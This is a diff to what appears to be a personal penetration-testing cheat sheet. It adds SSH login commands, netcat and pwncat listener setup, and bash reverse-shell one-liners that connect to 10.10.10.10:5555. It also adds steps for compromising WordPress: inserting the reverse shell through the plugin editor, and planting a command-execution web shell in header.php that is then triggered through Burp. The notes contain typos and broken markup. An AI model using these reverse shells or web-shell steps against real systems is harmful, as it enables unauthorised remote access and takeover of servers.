@@ -46,7 +46,7 @@ drwxr-xr-x pform pform 0069 Dec 32 00:00 .
 
 drwxr-xr-x pform pform 0069 Dec 32 20:00 ..
 
-drwxr-xr-x pform pform 0069 Dec 32 00:00 ... <b>  < - - - - - - - - - - - - ( 3 dots )</b>
+drwxr-xr-x pform pform 0069 Dec 32 00:00 ... <b>     < - - - - - - - - - - - - ( 3 dots )</b>
 
 -rw-r--r-x pform pform 0069 Dec 32 00:00 random-stuff.txt
 
@@ -59,13 +59,20 @@ I think remmina is slow, compared to xfreerdp.
 
 <b>pform@attacker~: </b><code>xfreerdp +clipboard +window-drag /u:username /p:password /v:IP</code>
 
-<h2>Listners</2>
+<h2>SSH</h2>
 
-<b>Netcat</b>
+<b>pform@attacker~: </b><code>ssh user@IP -p 22</code>
+
+<b>pform@attacker~: </b><code>ssh -i id_rsa user@IP -p 22</code>
+
+<h1>Listners</1>
+
+<h2>Netcat</h2>
 
 <b>pform@attacker~: </b><code>nc -lnvp 5555</code>
 
-<b>pwncat</b> <code>git clone https://github.com/calebstewart/pwncat.git; cd pwncat</code>
+<h2>pwncat</h2> 
+<code>git clone https://github.com/calebstewart/pwncat.git; cd pwncat</code>
 
 <b>pform@attacker~: </b><code>pwncat -l -p 5555</code>
   
@@ -76,3 +83,35 @@ I prefer pwncat as you can just press<b>"CTRL+D"</b> and download and upload fil
 <b>pform@local~: </b><code>upload ~/super-ninja-scripts/hightech-privesc-0day.py</code>
 
 Then Press <b>"CTRL+D"</b> again to return to the reverse-shell.
+
+<h1>Revers-Shell</h1>
+
+<h2>Bash</h2>
+
+/bin/bash -i >& /dev/tcp/10.10.10.10/5555
+
+/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.10.10/5555 0>&1'
+
+<h2>Wordpress example</h2>
+
+After logging in to the admin panel open the Plugin editor, in the bottom of a plugin.
+
+Add <code>/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.10.10/5555 0>&1'</code>
+
+---
+
+<b>Edit "header.php" </b>
+
+Under php tag
+
+<code>echo system($ REQUESTS['cmd']);</code>
+
+change request metod by left click
+
+open upp burp and run command in the bottom of the page:
+
+<code>cmd=whomai</code>
+
+<code>cmd=/bin/bash -i >& /dev/tcp/10.10.10.10/5555 0>&1</code>
+
+
